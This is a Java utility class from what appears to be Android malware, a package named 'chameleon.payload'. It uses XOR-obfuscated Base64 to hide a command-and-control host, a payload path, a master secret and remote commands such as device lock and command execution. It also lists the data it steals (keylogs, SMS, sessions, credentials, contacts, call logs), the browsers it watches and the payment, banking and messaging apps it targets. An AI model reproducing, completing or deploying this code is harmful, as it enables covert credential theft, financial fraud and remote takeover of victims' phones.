package com.chameleon.payload.util;

public class Secrets {
    private static final byte XOR_KEY = 0x55;

    public static String deobfuscate(String encoded) {
        try {
            byte[] raw = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP);
            byte[] result = new byte[raw.length];
            for (int i = 0; i < raw.length; i++) {
                result[i] = (byte)(raw[i] ^ XOR_KEY);
            }
            return new String(result, "UTF-8");
        } catch (Exception e) {
            return encoded;
        }
    }

    // C2
    public static final String C2_HOST = deobfuscate("IiIiezg8JzQ8Mjk6NzQ5eyY8ITA=");
    public static final String WS_PATH = deobfuscate("eiIm");
    public static final String PAYLOAD_PATH = deobfuscate("ejQlPHolNCw5OjQx");
    public static final String MASTER_SECRET = deobfuscate("MRk0HhInECAUNjYHNxI3ZmZiI20mZzAiLxYFIjwMD2MhJhkcPQwMGB8QEGg=");

    // Commands
    public static final String CMD_START_SWEEP = deobfuscate("JiE0JyEKJiIwMCU=");
    public static final String CMD_STOP_SWEEP = deobfuscate("JiE6JQomIjAwJQ==");
    public static final String CMD_LOCK_DEVICE = deobfuscate("OTo2PgoxMCM8NjA=");
    public static final String CMD_RELEASE_DEVICE = deobfuscate("JzA5MDQmMAoxMCM8NjA=");
    public static final String CMD_EXEC_COMMAND = deobfuscate("MC0wNgo2Ojg4NDsx");
    public static final String CMD_UPDATE_CONFIG = deobfuscate("ICUxNCEwCjY6OzM8Mg==");

    // Message types
    public static final String MSG_REGISTER = deobfuscate("JzAyPCYhMCc=");
    public static final String MSG_HEARTBEAT = deobfuscate("PTA0JyE3MDQh");
    public static final String MSG_DATA = deobfuscate("MTQhNA==");
    public static final String MSG_COMMAND = deobfuscate("Njo4ODQ7MQ==");
    public static final String MSG_COMMAND_ACK = deobfuscate("Njo4ODQ7MQo0Nj4=");

    // Data types
    public static final String DATA_KEYLOG = deobfuscate("PjAsOToy");
    public static final String DATA_SMS = deobfuscate("Jjgm");
    public static final String DATA_SESSION = deobfuscate("JjAmJjw6Ow==");
    public static final String DATA_FILE = deobfuscate("Mzw5MA==");
    public static final String DATA_NOTIFICATION = deobfuscate("OzohPDM8NjQhPDo7");
    public static final String DATA_CREDENTIAL = deobfuscate("NicwMTA7ITw0OQ==");
    public static final String DATA_CALL_LOG = deobfuscate("NjQ5OQo5OjI=");
    public static final String DATA_CONTACT = deobfuscate("Njo7ITQ2IQ==");
    public static final String DATA_APP_CHANGE = deobfuscate("NCUlCjY9NDsyMA==");
    public static final String DATA_TARGET_APP = deobfuscate("ITQnMjAhCjQlJQ==");

    // Browser packages
    public static final String BR_CHROME = deobfuscate("Njo4ezQ7MSc6PDF7Nj0nOjgw");
    public static final String BR_FIREFOX = deobfuscate("Oicyezg6Lzw5OTR7MzwnMDM6LQ==");
    public static final String BR_BRAVE = deobfuscate("Njo4ezcnNCMwezcnOiImMCc=");
    public static final String BR_OPERA = deobfuscate("Njo4ezolMCc0ezcnOiImMCc=");
    public static final String BR_EDGE = deobfuscate("Njo4ezg8Nic6JjozIXswODgt");
    public static final String BR_SAMSUNG = deobfuscate("Njo4eyYwNns0OzEnOjwxezQlJXsmNyc6IiYwJw==");
    public static final String BR_STOCK = deobfuscate("Njo4ezQ7MSc6PDF7Nyc6IiYwJw==");

    // Target apps
    public static final String TGT_BKASH = deobfuscate("Nz40Jj0=");
    public static final String TGT_NAGAD = deobfuscate("OzQyNDE=");
    public static final String TGT_PAYTM = deobfuscate("JTQsITg=");
    public static final String TGT_PAYPAL = deobfuscate("JTQsJTQ5");
    public static final String TGT_STRIPE = deobfuscate("JiEnPCUw");
    public static final String TGT_VENMO = deobfuscate("IzA7ODo=");
    public static final String TGT_WHATSAPP = deobfuscate("Ij00ISY0JSU=");
    public static final String TGT_TELEGRAM = deobfuscate("ITA5MDInNDg=");
    public static final String TGT_FACEBOOK = deobfuscate("MzQ2MDc6Oj4=");
    public static final String TGT_INSTAGRAM = deobfuscate("PDsmITQyJzQ4");
    public static final String TGT_LINKEDIN = deobfuscate("OTw7PjAxPDs=");
}
